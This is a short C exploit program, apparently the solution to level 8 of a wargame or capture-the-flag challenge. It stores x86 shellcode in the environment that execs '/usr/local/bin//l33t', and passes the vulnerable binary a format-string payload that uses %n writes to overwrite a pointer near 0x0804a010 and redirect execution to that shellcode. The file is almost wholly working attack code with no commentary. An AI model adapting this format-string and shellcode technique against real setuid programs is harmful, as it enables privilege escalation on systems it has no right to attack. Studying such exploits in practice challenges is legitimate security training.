#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

	unsigned char mc[] = "\x31\xc0\x31\xc9\x31\xd2\x50\x68\x6c\x33\x33\x74\x68\x69\x6e\x2f\x2f\x68\x61\x6c\x2f\x62\x68\x2f\x6c\x6f\x63\x68\x2f\x75\x73\x72\x89\xe3\xb0\x0b\xcd\x80";

#define VULN "/var/challenge/level8/8"
#define RETLOC 0804a010 

int main(int argc, char **argv)
{
	char retaddr[] = 
	"AA"
	"\x10\xa0\x04\x08"
        "\x11\xa0\x04\x08"
       	"\x12\xa0\x04\x08"
       	"\x13\xa0\x04\x08"
       	"%161u%68$n"
       	"%70u%69$n"
	"%256u%70$n"
	"%192u%71$n";

	char *prgwprm[] = {VULN, retaddr, NULL};
	char *envp[] = {mc, NULL};

	execve(prgwprm[0], prgwprm, envp);
	return 0;
}
